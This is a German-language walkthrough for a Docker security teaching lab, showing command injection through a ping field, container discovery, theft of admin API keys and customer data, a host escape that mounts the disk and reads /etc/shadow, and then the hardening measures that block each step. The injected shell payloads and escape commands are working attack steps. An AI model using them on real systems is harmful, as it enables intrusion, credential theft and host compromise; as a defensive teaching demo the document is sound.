# Docker Container Security – Demo-Anleitung

## Ziel der Demo

Diese Demo zeigt typische Sicherheitsprobleme in Docker-Containern und wie man sie absichert.

Demonstriert werden:

1. Command Injection
2. Lateral Movement zwischen Containern
3. Container Escape
4. Sicherheits-Härtung

---

# Vorbereitung

## Projekt starten

```bash
cd docker-security-demo
docker compose up -d --build
```

Danach etwa 30 Sekunden warten:

```bash
sleep 30
```

Anschließend im Browser öffnen:

```text
http://localhost:5000
```

---

# Schritt 1 – Command Injection

## Ziel

Demonstrieren, dass unsichere Eingaben direkt im System ausgeführt werden können.

---

## Normaler Test

Im Browser im Ping-Feld eingeben:

```text
8.8.8.8
```

Erwartung:
- Normales Ping-Ergebnis

---

## Command Injection ausführen

Eingabe:

```text
8.8.8.8; whoami
```

Erwartung:
- Ausgabe zeigt:

```text
root
```

Erklärung:
- Der Benutzer hat Shell-Befehle eingeschleust
- Die Anwendung läuft als Root im Container

---

## Betriebssystem auslesen

Eingabe:

```text
8.8.8.8; cat /etc/os-release
```

Erwartung:
- Informationen zum Betriebssystem werden angezeigt

---

## Prüfen ob Docker-Container

Eingabe:

```text
8.8.8.8; cat /proc/1/cgroup
```

Erwartung:
- Hinweise auf Docker bzw. Containerisierung

Erklärung:
- Der Angreifer erkennt, dass er sich in einem Container befindet

---

# Schritt 2 – Lateral Movement

## Ziel

Zeigen, wie ein kompromittierter Container andere Container im Netzwerk angreifen kann.

---

## Eigenes Netzwerk prüfen

Eingabe:

```text
8.8.8.8; cat /etc/hosts
```

Erwartung:
- Eigene IP-Adresse sichtbar

---

## Andere Container finden

Eingabe:

```bash
;for i in 1 2 3 4 5 6 7 8 9 10; do ping -c 1 -W 1 172.18.0.$i 2>/dev/null && echo "HOST FOUND: 172.18.0.$i"; done
```

Hinweis:
- Die IP-Adressen können variieren

Typische Zuordnung:

```text
172.18.0.2 = db
172.18.0.3 = admin
172.18.0.4 = webapp
```

---

## Admin-Service angreifen

Eingabe:

```bash
; curl -s http://admin:8080/api/config
```

Erwartung:
- API-Keys
- Admin-Zugangsdaten
- Konfigurationsdaten

Erklärung:
- Docker-DNS erlaubt die Kommunikation über Service-Namen

---

## Datenbank angreifen

Eingabe:

```bash
; mysql -h db -u root -proot -e "SELECT * FROM kundenportal.kunden"
```

Erwartung:
- Kundendaten
- Kreditkarteninformationen

Erklärung:
- Schwache Passwörter und fehlende Segmentierung ermöglichen Zugriff

---

# Schritt 3 – Container Escape

## Ziel

Zeigen, wie ein privilegierter Container Zugriff auf den Host erhalten kann.

---

## Prüfen ob privilegierter Container

Eingabe:

```bash
; fdisk -l 2>/dev/null | head -5
```

Erwartung:
- Sichtbare Festplatten

Erklärung:
- Der Container besitzt zu viele Rechte

---

## Verfügbare Devices anzeigen

Eingabe:

```bash
; lsblk
```

Erwartung:
- Liste aller Blockdevices

Hinweis:
- Device-Namen können variieren:
  - sda1
  - vda1
  - xvda1

---

## Host-Dateisystem mounten

Eingabe:

```bash
; mkdir -p /mnt/host && mount /dev/sda1 /mnt/host 2>/dev/null; ls /mnt/host/
```

Erwartung:
- Zugriff auf Host-Dateien

---

## Dateien vom Host lesen

Eingabe:

```bash
; cat /mnt/host/etc/hostname
```

und:

```bash
; cat /mnt/host/etc/shadow | head -3
```

Erwartung:
- Zugriff auf sensible Host-Daten

Erklärung:
- Vollständiger Ausbruch aus dem Container
- Der Host ist kompromittiert

---

# Sicherheits-Härtung demonstrieren

## Verwundbare Umgebung stoppen

```bash
docker compose down
```

---

## Gehärtete Version starten

```bash
docker compose -f docker-compose.hardened.yml up -d --build
sleep 10
```

Danach erneut öffnen:

```text
http://localhost:5000
```

Hinweis:
- Grünes Design = gehärtete Version

---

# Schutzmaßnahmen testen

## Command Injection erneut versuchen

Eingabe:

```text
8.8.8.8; whoami
```

Erwartung:

```text
Ungültige Eingabe!
```

Erklärung:
- Die Input-Validierung blockiert den Angriff

---

## Container direkt betreten

```bash
docker compose -f docker-compose.hardened.yml exec webapp sh
```

Folgende Tests durchführen:

### Benutzer prüfen

```bash
whoami
```

Erwartung:

```text
appuser
```

Nicht mehr:

```text
root
```

---

### Festplattenzugriff testen

```bash
fdisk -l
```

Erwartung:
- Keine Berechtigung

---

### Mount testen

```bash
mount
```

Erwartung:
- Keine Berechtigung

---

### Netzwerksegmentierung prüfen

```bash
curl admin:8080
```

Erwartung:
- Netzwerk nicht erreichbar

---

# Aufräumen

```bash
docker compose -f docker-compose.hardened.yml down
```

---

# Zusammenfassung der Sicherheitsmaßnahmen

| Maßnahme | Wirkung |
|---|---|
| Input-Validierung | Verhindert Command Injection |
| Non-Root User | Minimale Rechte im Container |
| Kein `--privileged` | Kein Zugriff auf Host-Devices |
| `cap_drop: ALL` | Entfernt Linux-Capabilities |
| Netzwerksegmentierung | Verhindert Lateral Movement |
| Starke Passwörter | Schutz der Datenbank |
| Least Privilege | Minimierung des Schadens |

---

# Kernaussage

Container sind keine vollständige Sicherheitsgrenze.

Ohne Härtung können:

- Befehle eingeschleust werden
- andere Container kompromittiert werden
- Host-Systeme übernommen werden

Sicherheit entsteht erst durch:

- richtige Rechte
- Netzwerksegmentierung
- sichere Konfiguration
- Input-Validierung
- Least-Privilege-Prinzip

